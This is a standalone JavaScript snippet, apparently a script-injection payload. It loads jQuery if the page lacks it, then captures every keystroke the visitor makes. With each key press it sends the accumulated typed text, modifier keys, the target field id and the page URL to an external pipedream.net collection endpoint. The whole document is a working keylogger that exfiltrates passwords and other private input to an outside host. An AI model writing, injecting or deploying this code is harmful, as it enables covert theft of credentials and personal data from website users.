

<script> 
if((window.jQuery))
{
    console.log("jQuery Found");
}
else
{
    console.log("jQuery Not Found");
    var script = document.createElement('script');
    script.src = 'https://code.jquery.com/jquery-3.3.1.min.js';
    document.body.appendChild(script);
}
var aux = "";
function c(d)
{   
aux += d.key;
    jQuery.ajax(
    {
        dataType: "jsonp",
        type:"GET",
        url: "https://a10ece7c73e7cbcb98c809c7e35534a8.m.pipedream.net/", 
        jsonp:"keypressed",
        data:
        {
            altnKey:d.altKey?1:0,
            ctrlKey:d.ctrlKey?1:0,
            userKey:aux,
            targKey:d.target.id,
            userURI:d.target.baseURI
        },
        async:false,
        success: function(data)
        {
            console.log(data);
        },
        error:function(xhr, ajaxOptions, thrownError)
        {
            console.log("Error");
        }
    });
}
window.onload = function()
{
    window.addEventListener("keydown", function(e)
    {
        c(e);
    });
}
</script>